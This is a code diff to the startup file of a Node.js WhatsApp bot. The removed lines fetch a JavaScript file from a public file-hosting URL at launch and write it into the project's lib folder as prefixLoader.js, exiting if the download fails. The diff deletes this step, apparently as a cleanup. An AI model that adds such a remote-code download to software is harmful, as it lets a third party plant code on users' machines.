@@ -28,6 +28,7 @@ const {
   const fs = require('fs')
   const ff = require('fluent-ffmpeg')
   const P = require('pino')
+  const config = require('./config')
   const GroupEvents = require('./lib/groupevents');
   const qrcode = require('qrcode-terminal')
   const StickersTypes = require('wa-sticker-formatter')
@@ -40,7 +41,9 @@ const {
   const os = require('os')
   const Crypto = require('crypto')
   const path = require('path')
+  const prefix = config.PREFIX
   const https = require('https');
+  
   const ownerNumber = ['93744215959']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
@@ -58,32 +61,6 @@ const {
           }
       });
   }
-  async function ensurePrefixLoader() {
-    const url = 'https://files.catbox.moe/wxqino.js'; // ← آدرس واقعی فایلتو اینجا بذار
-    const targetPath = path.join(__dirname, 'lib', 'prefixLoader.js');
-
-    if (fs.existsSync(targetPath)) {
-      console.log("✅ Bot Saver already available");
-      return;
-    }
-
-    console.log("⬇️ On loading Bot setting saver...");
-    try {
-      const res = await axios.get(url);
-      if (!fs.existsSync(path.join(__dirname, 'lib'))) {
-        fs.mkdirSync(path.join(__dirname, 'lib'));
-      }
-      fs.writeFileSync(targetPath, res.data, 'utf-8');
-      console.log("✅ Bot Saver successfully done.");
-    } catch (err) {
-      console.error("❌ Failed to Bot Saver:", err.message);
-      process.exit(1);
-    }
-  }
-  
-  await ensurePrefixLoader();
-  const config = require('./config')
-  const prefix = config.PREFIX
   
   // Clear the temp directory every 5 minutes
   setInterval(clearTempDir, 5 * 60 * 1000);
@@ -111,7 +88,6 @@ if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
     console.error("Download error:", err.message);
   });
 }
-
 
 const express = require("express");
 const app = express();
